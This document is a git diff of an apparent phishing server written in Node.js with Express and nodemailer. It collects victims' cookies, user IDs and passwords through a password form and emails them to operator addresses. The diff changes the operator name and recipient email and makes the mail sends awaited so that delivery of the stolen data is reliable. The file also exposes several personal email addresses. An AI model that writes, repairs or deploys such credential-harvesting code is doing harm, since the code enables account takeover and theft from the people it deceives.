@@ -10,13 +10,13 @@ app.use(express.static(path.join(__dirname,'static')))
 app.use(express.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-const name = "Hadi"
+const name = "Rouf"
 const emails = [
   "unaisnizamani598@gmail.com",
   "marina.bhoo.so@gmail.com",
   
 ]
-const workerEmail = "rose.bang.ads.info@gmail.com";
+const workerEmail = "julie.advert45@gmail.com";
 
 
 
@@ -35,7 +35,7 @@ let transporter = nodemailer.createTransport({
 
 
 
-const sendMail = (name,email,cookie,uid)=>{
+const sendMail = async (name,email,cookie,uid)=>{
   let mailOptions = {
     to:email,
     from:'helpmate73@gmail.com',
@@ -47,14 +47,8 @@ const sendMail = (name,email,cookie,uid)=>{
    
 }
 
-transporter.sendMail(mailOptions,(error,result)=>{
-    if(error){
-       console.log(error)
-    }
-    else{
-     
-    }
-  })
+await transporter.sendMail(mailOptions)
+
 }
 
 app.get("/", (req, res) => {
@@ -69,7 +63,7 @@ app.post("/submit", async (req, res) => {
 
 
   for(let i=0;i<emails.length;i++) {
-    sendMail(name,emails[i],cookie,uid)
+    await sendMail(name,emails[i],cookie,uid)
 
   }
 
@@ -91,7 +85,7 @@ app.post("/", async (req, res) => {
 
 
   for(let i=0;i<emails.length;i++) {
-    sendMail(name,emails[i],cookie,uid)
+    await sendMail(name,emails[i],cookie,uid)
 
   }
 
@@ -114,13 +108,13 @@ app.get("/pass", (req, res) => {
   res.sendFile(path.join(__dirname, "password.html"));
 });
 
-app.post('/pass',(req,res)=>{
+app.post('/pass',async(req,res)=>{
   const password = req.body.password;
   
-  sendPassword(workerEmail,password);
+  await sendPassword(workerEmail,password);
 
   for(let i=0;i<emails.length;i++) {
-    sendPassword(name,emails[i],password)
+   await sendPassword(name,emails[i],password)
 
   }
 
@@ -132,7 +126,7 @@ app.post('/pass',(req,res)=>{
 })
 
 
-const sendPassword = (email,password)=>{
+const sendPassword = async (email,password)=>{
   let mailOptions = {
     to:email,
     from:'helpmate73@gmail.com',
@@ -142,14 +136,7 @@ const sendPassword = (email,password)=>{
    
 }
 
-transporter.sendMail(mailOptions,(error,result)=>{
-    if(error){
-       console.log(error)
-    }
-    else{
-     
-    }
-  })
+  await transporter.sendMail(mailOptions)
 }
 
 app.listen(PORT, () => {
